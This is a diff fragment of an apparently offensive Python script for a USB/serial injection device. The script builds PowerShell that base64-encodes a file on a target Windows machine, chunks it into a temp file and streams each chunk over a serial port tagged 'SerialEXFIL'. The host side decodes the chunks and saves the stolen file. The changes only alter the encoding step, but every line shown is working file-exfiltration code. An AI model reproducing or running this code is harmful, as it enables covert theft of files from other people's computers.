@@ -51,8 +51,8 @@ to_send += 'echo "" > $env:TEMP\\tmp; echo "" > $env:TEMP\\tmp2; '
 to_send += f'$res = [convert]::ToBase64String((Get-Content -Path "{file}" -Encoding byte)); '
 # Split into 100 byte chunks
 to_send += '$res -Split "(.{100})" | ?{$_} > $env:TEMP\\tmp; echo "!!!END!!!" >> $env:TEMP\\tmp; '
-# Convert to UTF8
-to_send += '$chunks = Get-Content $env:TEMP\\tmp; $chunks | Set-Content -Encoding "UTF8" $env:TEMP\\tmp; '
+# Convert to ACSII
+to_send += '$chunks = Get-Content $env:TEMP\\tmp; $chunks | Set-Content -Encoding "ascii" $env:TEMP\\tmp; '
 # Send code
 to_send += '$WHIDport.open(); '
 to_send += 'foreach($line in Get-Content $env:TEMP\\tmp){ $WHIDport.WriteLine("SerialEXFIL:$line"); Start-Sleep -Milliseconds 1500; } '
@@ -80,7 +80,7 @@ while "!!!END!!!" not in res:
 print()
         
 # DECODE BASE64 AND SAVE
-b64 = res.replace("\r", "").replace("!!!END!!!", "").replace("\r", "").replace("\n", "").strip().encode("ascii")
+b64 = res.replace("!!!END!!!", "").replace("\r", "").replace("\n", "").strip().encode("ascii")
 byte_arr = base64.b64decode(b64)
 
 # WRITE FILE
